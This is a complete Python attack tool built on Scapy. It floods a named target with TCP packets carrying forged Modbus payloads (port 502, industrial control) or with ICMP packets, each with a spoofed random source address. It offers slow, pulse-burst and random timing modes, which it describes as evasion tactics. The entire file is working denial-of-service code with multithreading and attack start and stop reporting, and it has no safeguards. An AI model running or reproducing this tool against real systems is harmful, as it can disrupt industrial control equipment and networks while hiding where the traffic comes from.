#!/usr/bin/env python3
"""
Temporal DoS flooder that provides slow, pulse, and random Modbus-style attacks
for both TCP and ICMP traffic. All behaviour is controlled via CLI arguments so
operators can model different low-and-slow or bursty evasion tactics.
"""

import argparse
import os
import random
import signal
import sys
import threading
import time
from dataclasses import dataclass
from datetime import datetime
from typing import Callable, Iterable, Optional, Tuple

from scapy.all import (
    Raw,
    ICMP,
    IP,
    TCP,
    RandIP,
    conf,
)

# Disable verbose Scapy logging so worker output stays clean.
conf.verb = 0


DEFAULT_FUNCTION_CODES = [1, 2, 3, 4, 5, 6, 15, 16, 43]


@dataclass
class SlowTCPSession:
    target: str
    dport: int
    payload_size: int
    rng: random.Random
    src_ip: str = ""
    sport: int = 0
    seq: int = 0

    def __post_init__(self) -> None:
        self.src_ip = self.src_ip or str(RandIP())
        self.sport = self.sport or self.rng.randint(1024, 65535)
        self.seq = self.seq or self.rng.randint(0, 0xFFFF_FFFF)

    def build_packet(self, payload: bytes) -> IP:
        tcp = TCP(
            dport=self.dport,
            sport=self.sport,
            flags="PA",
            seq=self.seq,
            ack=0,
        )
        pkt = IP(dst=self.target, src=self.src_ip, ttl=64) / tcp / Raw(load=payload)
        self.seq = (self.seq + len(payload)) % (1 << 32)
        return pkt


@dataclass
class SlowICMPSession:
    target: str
    payload_size: int
    rng: random.Random
    src_ip: str = ""
    icmp_id: int = 0
    seq: int = 0

    def __post_init__(self) -> None:
        self.src_ip = self.src_ip or str(RandIP())
        self.icmp_id = self.icmp_id or self.rng.randint(0, 0xFFFF)
        self.seq = self.seq or self.rng.randint(0, 0xFFFF)

    def build_packet(self, payload: bytes) -> IP:
        icmp = ICMP(id=self.icmp_id, seq=self.seq & 0xFFFF)
        pkt = IP(dst=self.target, src=self.src_ip, ttl=64) / icmp / Raw(load=payload)
        self.seq = (self.seq + 1) & 0xFFFF
        return pkt


def parse_range(value: str) -> Tuple[int, int]:
    try:
        low_str, high_str = value.split(":", 1)
        low, high = int(low_str), int(high_str)
    except ValueError as exc:
        raise argparse.ArgumentTypeError(
            f"Expected unit-id range in the form low:high, got '{value}'"
        ) from exc
    if low < 0 or high > 255 or low > high:
        raise argparse.ArgumentTypeError(
            f"Unit-id range must be within 0-255 and low<=high, got '{value}'"
        )
    return low, high


def parse_function_codes(csv: str) -> Iterable[int]:
    codes = []
    for item in csv.split(","):
        item = item.strip()
        if not item:
            continue
        try:
            code = int(item, 0)
        except ValueError as exc:
            raise argparse.ArgumentTypeError(
                f"Invalid function code '{item}'"
            ) from exc
        if code < 0 or code > 255:
            raise argparse.ArgumentTypeError(
                f"Function code '{code}' must be between 0 and 255"
            )
        codes.append(code)
    if not codes:
        raise argparse.ArgumentTypeError("At least one function code is required")
    return codes


def build_modbus_payload(
    size: int,
    rng: random.Random,
    unit_range: Tuple[int, int],
    function_codes: Iterable[int],
) -> bytes:
    size = max(size, 8)
    tx_id = rng.getrandbits(16)
    proto_id = rng.getrandbits(16)
    unit_id = rng.randint(unit_range[0], unit_range[1])
    func_code = rng.choice(tuple(function_codes))
    # Length covers unit id + function code + remaining payload.
    remaining = max(size - 8, 0)
    length_field = remaining + 2
    header = (
        tx_id.to_bytes(2, "big")
        + proto_id.to_bytes(2, "big")
        + length_field.to_bytes(2, "big")
        + bytes([unit_id, func_code])
    )
    payload = header + os.urandom(remaining)
    return payload[:size]


def craft_tcp_packet(
    target: str,
    dport: int,
    payload: bytes,
    rng: random.Random,
    flags: str = "PA",
) -> IP:
    pkt = (
        IP(dst=target, src=str(RandIP()), ttl=64)
        / TCP(
            dport=dport,
            sport=rng.randint(1024, 65535),
            flags=flags,
            seq=rng.randint(0, 0xFFFF_FFFF),
            ack=0,
        )
        / Raw(load=payload)
    )
    return pkt


def craft_icmp_packet(target: str, payload: bytes, rng: random.Random) -> IP:
    pkt = (
        IP(dst=target, src=str(RandIP()), ttl=64)
        / ICMP(id=rng.randint(0, 0xFFFF), seq=rng.randint(0, 0xFFFF))
        / Raw(load=payload)
    )
    return pkt


def run_slow_worker(worker_id: int, args: argparse.Namespace, stop_event: threading.Event) -> None:
    rng = random.Random(args.seed + worker_id if args.seed is not None else time.time_ns())
    sock = conf.L3socket(iface=args.iface or conf.iface)
    try:
        if args.protocol == "tcp":
            session = SlowTCPSession(args.target, args.port, args.payload_size, rng)
            while not stop_event.is_set():
                payload = build_modbus_payload(
                    args.payload_size, rng, args.unit_range, args.function_codes
                )
                pkt = session.build_packet(payload)
                sock.send(pkt)
                if stop_event.wait(rng.uniform(args.min_irt, args.max_irt)):
                    break
        else:
            session = SlowICMPSession(args.target, args.payload_size, rng)
            while not stop_event.is_set():
                payload = os.urandom(args.payload_size)
                pkt = session.build_packet(payload)
                sock.send(pkt)
                if stop_event.wait(rng.uniform(args.min_irt, args.max_irt)):
                    break
    finally:
        sock.close()


def run_pulse_worker(worker_id: int, args: argparse.Namespace, stop_event: threading.Event) -> None:
    rng = random.Random(args.seed + worker_id if args.seed is not None else time.time_ns())
    sock = conf.L3socket(iface=args.iface or conf.iface)
    try:
        while not stop_event.is_set():
            burst_start = time.perf_counter()
            for _ in range(args.burst_packets):
                if stop_event.is_set():
                    break
                payload = (
                    build_modbus_payload(
                        args.payload_size, rng, args.unit_range, args.function_codes
                    )
                    if args.protocol == "tcp"
                    else os.urandom(args.payload_size)
                )
                pkt = (
                    craft_tcp_packet(args.target, args.port, payload, rng, flags="PA")
                    if args.protocol == "tcp"
                    else craft_icmp_packet(args.target, payload, rng)
                )
                sock.send(pkt)
            elapsed = time.perf_counter() - burst_start
            if args.burst_window > 0:
                remaining = max(0.0, args.burst_window - elapsed)
                if stop_event.wait(remaining):
                    break
            if stop_event.wait(args.silence):
                break
    finally:
        sock.close()


def run_random_worker(worker_id: int, args: argparse.Namespace, stop_event: threading.Event) -> None:
    rng = random.Random(args.seed + worker_id if args.seed is not None else time.time_ns())
    sock = conf.L3socket(iface=args.iface or conf.iface)
    inter_delay = 0.0 if args.pps <= 0 else max(0.0, 1.0 / args.pps)
    try:
        while not stop_event.is_set():
            payload = (
                build_modbus_payload(
                    args.payload_size, rng, args.unit_range, args.function_codes
                )
                if args.protocol == "tcp"
                else os.urandom(args.payload_size)
            )
            pkt = (
                craft_tcp_packet(args.target, args.port, payload, rng, flags="PA")
                if args.protocol == "tcp"
                else craft_icmp_packet(args.target, payload, rng)
            )
            sock.send(pkt)
            if inter_delay > 0 and stop_event.wait(inter_delay):
                break
    finally:
        sock.close()


WORKER_MAP: dict[str, Callable[[int, argparse.Namespace, threading.Event], None]] = {
    "slow": run_slow_worker,
    "pulse": run_pulse_worker,
    "random": run_random_worker,
}


def parse_args(argv: Optional[Iterable[str]] = None) -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="Temporal DoS generator supporting slow, pulse, and random variants."
    )
    parser.add_argument("--target", required=True, help="Target IPv4 address.")
    parser.add_argument(
        "--protocol",
        choices=("tcp", "icmp"),
        required=True,
        help="Transport protocol to flood.",
    )
    parser.add_argument(
        "--variant",
        choices=tuple(WORKER_MAP.keys()),
        required=True,
        help="Flooding tactic to deploy.",
    )
    parser.add_argument(
        "--port",
        type=int,
        default=502,
        help="Destination TCP port (Modbus defaults to 502). Ignored for ICMP.",
    )
    parser.add_argument(
        "--workers",
        type=int,
        default=4,
        help="Number of concurrent worker threads.",
    )
    parser.add_argument(
        "--payload-size",
        type=int,
        default=256,
        help="Payload size per packet in bytes.",
    )
    parser.add_argument(
        "--min-irt",
        type=float,
        default=5.0,
        help="Minimum inter-request time in seconds for slow variant.",
    )
    parser.add_argument(
        "--max-irt",
        type=float,
        default=15.0,
        help="Maximum inter-request time in seconds for slow variant.",
    )
    parser.add_argument(
        "--burst-packets",
        type=int,
        default=1000,
        help="Packets to emit per burst for the pulse variant.",
    )
    parser.add_argument(
        "--burst-window",
        type=float,
        default=0.1,
        help="Target window (seconds) to send a burst in for the pulse variant.",
    )
    parser.add_argument(
        "--silence",
        type=float,
        default=10.0,
        help="Silence duration (seconds) between bursts for the pulse variant.",
    )
    parser.add_argument(
        "--pps",
        type=float,
        default=200.0,
        help="Packets-per-second throttle for the random variant (0 for unlimited).",
    )
    parser.add_argument(
        "--iface",
        default=None,
        help="Interface to send packets from (defaults to Scapy's conf.iface).",
    )
    parser.add_argument(
        "--duration",
        type=float,
        default=0.0,
        help="Total run time in seconds (0 means run until interrupted).",
    )
    parser.add_argument(
        "--seed",
        type=int,
        default=42,
        help="Seed to make worker randomness deterministic.",
    )
    parser.add_argument(
        "--unit-range",
        type=parse_range,
        default=(0, 247),
        help="Range for Modbus unit identifiers as low:high (default 0:247).",
    )
    parser.add_argument(
        "--function-codes",
        type=parse_function_codes,
        default=DEFAULT_FUNCTION_CODES,
        help="Comma separated Modbus function codes (default common codes).",
    )
    args = parser.parse_args(list(argv) if argv is not None else None)
    if args.protocol == "icmp":
        # Port is irrelevant; keep CLI consistent but mute warnings.
        args.port = 0
    if args.min_irt > args.max_irt:
        parser.error("--min-irt must be <= --max-irt")
    return args


def install_signal_handlers(stop_event: threading.Event) -> None:
    def handler(signum, _frame):
        print(f"\n[!] Received signal {signum}, stopping workers...")
        stop_event.set()

    signal.signal(signal.SIGINT, handler)
    if hasattr(signal, "SIGTERM"):
        signal.signal(signal.SIGTERM, handler)


def print_configuration(args: argparse.Namespace) -> None:
    print(
        "\n[CONFIG]"
        f"\nTarget: {args.target}"
        f"\nProtocol: {args.protocol.upper()}"
        f"\nVariant: {args.variant}"
        f"\nWorkers: {args.workers}"
        f"\nPayload Size: {args.payload_size}B"
        f"\nInterface: {args.iface or conf.iface}"
    )
    if args.protocol == "tcp":
        print(f"Port: {args.port}")
        func_codes = ", ".join(str(code) for code in args.function_codes)
        print(f"Unit-ID Range: {args.unit_range[0]}-{args.unit_range[1]}")
        print(f"Function Codes: {func_codes}")
    if args.variant == "slow":
        print(f"IRT Range: {args.min_irt:.2f}s - {args.max_irt:.2f}s")
    elif args.variant == "pulse":
        print(
            f"Burst: {args.burst_packets} packets in <= {args.burst_window:.3f}s, "
            f"Silence: {args.silence:.2f}s"
        )
    else:
        throttle = "unlimited" if args.pps <= 0 else f"{args.pps:.2f} pps"
        print(f"Throughput: {throttle}")
    if args.duration:
        print(f"Duration: {args.duration:.2f}s")
    print("")


def main(argv: Optional[Iterable[str]] = None) -> int:
    args = parse_args(argv)
    worker_fn = WORKER_MAP[args.variant]
    stop_event = threading.Event()
    install_signal_handlers(stop_event)

    threads = []
    for worker_id in range(args.workers):
        thread = threading.Thread(
            target=worker_fn, args=(worker_id, args, stop_event), daemon=True
        )
        thread.start()
        threads.append(thread)

    start = datetime.now()
    print_configuration(args)
    print(f"[+] Attack started at {start.strftime('%Y-%m-%d %H:%M:%S')}")

    try:
        if args.duration > 0:
            deadline = time.time() + args.duration
            while time.time() < deadline and not stop_event.is_set():
                time.sleep(0.5)
            stop_event.set()
        else:
            while any(thread.is_alive() for thread in threads):
                time.sleep(0.5)
    except KeyboardInterrupt:
        stop_event.set()
    finally:
        for thread in threads:
            thread.join(timeout=1.0)
        end = datetime.now()
        print(f"[+] Attack ended at {end.strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"[+] Attack duration: {end - start}")
    return 0


if __name__ == "__main__":
    sys.exit(main())

